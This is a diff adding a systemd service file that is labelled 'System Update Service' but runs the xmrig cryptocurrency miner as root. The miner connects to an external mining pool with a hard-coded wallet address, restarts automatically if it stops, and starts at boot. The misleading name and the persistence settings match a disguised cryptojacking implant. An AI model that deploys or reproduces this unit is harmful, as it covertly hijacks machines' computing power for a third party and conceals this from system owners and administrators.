@@ -1,0 +1,13 @@
+[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/root/Ongo-Manage/xmrig-6.24.0/xmrig --url pool.hashvault.pro:443 --user 88tGYBwhWNzGesQs5QkwE1PdBa1tXGb9dcjxrdwujU3SEs3i7psaoJc4KmrDvv4VPTNtXazDWGkvGGfqurdBggvPEhZ43DJ --pass next --donate-level 0 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+Restart=always
+RestartSec=10
+User=root
+
+[Install]
+WantedBy=multi-user.target
